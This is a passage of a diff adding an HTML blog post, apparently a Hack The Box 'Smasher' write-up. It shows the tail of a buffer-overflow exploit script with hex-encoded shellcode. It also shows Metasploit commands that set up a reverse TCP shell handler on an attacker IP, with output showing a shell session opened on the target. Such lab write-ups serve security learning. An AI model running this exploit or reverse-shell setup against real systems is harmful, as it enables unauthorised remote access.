+</span><span>buf += &quot;</span><span style="color:#96b5b4;">\xad\x62\xe2\xed\x5e\x43\x76\xff\x3a\x71\xe4\xfc\xcb</span><span>&quot;
+</span><span>buf += &quot;</span><span style="color:#96b5b4;">\x8a\x68\xe2\x25\x92\x20\xec\x90\x7c\x0d\xe2\x34\x42</span><span>&quot;
+</span><span>buf += &quot;</span><span style="color:#96b5b4;">\x98\xec\x24\x4a\x7b\x20\x07\x27\x9f\xce\xa0\xd5\x0d</span><span>&quot;
+</span><span>buf += &quot;</span><span style="color:#96b5b4;">\xe2\x33\x41\xc8\xa1\xe9\x0f\xc2\x9f\x82\xe4\x21\xa4</span><span>&quot;
+</span><span>buf += &quot;</span><span style="color:#96b5b4;">\xa1\x8a\x02\xe7\x6d\x1b</span><span>&quot;
+</span><span>buf += &#39;</span><span style="color:#a3be8c;">Z</span><span>&#39; * (</span><span style="color:#d08770;">1024 </span><span>- </span><span style="color:#96b5b4;">len</span><span>(buf))
+</span><span>response = </span><span style="color:#bf616a;">exploit</span><span>(buf)     
+</span></code></pre>
+<p>Before running, remmember to start handler.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span>
+</span><span style="color:#bf616a;">msf </span><span>&gt; use multi/handler
+</span><span style="color:#bf616a;">msf</span><span> exploit(multi/handler) &gt; set </span><span style="color:#bf616a;">payload</span><span> linux/x64/shell/reverse_tcp
+</span><span style="color:#bf616a;">payload</span><span> =&gt; linux/x64/shell/reverse_tcp
+</span><span style="color:#bf616a;">msf</span><span> exploit(multi/handler) &gt; set </span><span style="color:#bf616a;">LHOST</span><span> 10.10.13.238
+</span><span style="color:#bf616a;">LHOST</span><span> =&gt; </span><span style="color:#d08770;">10</span><span>.10.13.238
+</span><span style="color:#bf616a;">msf</span><span> exploit(multi/handler) &gt; run
+</span><span>
+</span><span style="color:#bf616a;">[*]</span><span> Started reverse TCP handler on 10.10.13.238:4444 
+</span></code></pre>
+<p>And run exploit!</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span>
+</span><span style="color:#bf616a;">[badarg:~/ctf/hackthebox/box/Smasher]$</span><span> python smasher_reverse_tcp.py 
+</span><span>    </span><span style="color:#8fa1b3;">read</span><span>() is at 0x7fd2fce03250
+</span><span>    libc base is at 0x7fd2fcd0c000
+</span></code></pre>
+<p>If you check your multi handler, you will see new session</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span>
+</span><span style="color:#bf616a;">[*]</span><span> Sending stage (38 bytes) </span><span style="color:#bf616a;">to</span><span> 10.10.10.89
+</span><span style="color:#bf616a;">[*]</span><span> Command shell session 1 opened (10.10.13.238:4444 -&gt; </span><span style="color:#d08770;">10</span><span>.10.10.89:36424) </span><span style="color:#bf616a;">at</span><span> 2018-10-01 18:07:20 +0200
+</span></code></pre>
+<p><img src="/images/smasher-2018-11-22/2025-01-18_19-17-56_image.png" alt="" /></p>
+<h1 id="conclusion">Conclusion</h1>
+<p>That's it. Now tha you have a shell it's time to move onto a second
+stage, which is fighting this guy</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span>
+</span><span style="color:#bf616a;">ps</span><span> aux | </span><span style="color:#bf616a;">grep</span><span> crackme.py
+</span><span style="color:#bf616a;">smasher</span><span>    714  0.0  0.1  24364  1784 ?        S    16:52   0:00 socat TCP-LISTEN:1337,reuseaddr,fork,bind=127.0.0.1 EXEC:/usr/bin/python /home/smasher/crackme.py
+</span></code></pre>
+
+        </div>
+    </article>
+
+        </div>
+    </div>
+    
+    <a href="#top" class="top-btn">⏫</a>
+<footer>
+    <a href="https://mastodon.social/@spiperac" target="_blank" rel="noopener noreferrer">
+        <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/mastodon.svg" alt="Mastodon" style="width: 24px; height: 24px;" />
+    </a>
+
+    <a href="https://github.com/spiperac" target="_blank" rel="noopener noreferrer">
+        <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/github.svg" alt="GitHub" style="width: 24px; height: 24px;" />
+    </a>
+
+    <a href="mailto:sp@spiperac.dev">
+        <img src="https://www.svgrepo.com/show/14478/email.svg" alt="Email" style="width: 24px; height: 24px;" />
+    </a>
+
+    <p>© 2025 spiperac</p>
+</footer>
+
+</body>
+</html>
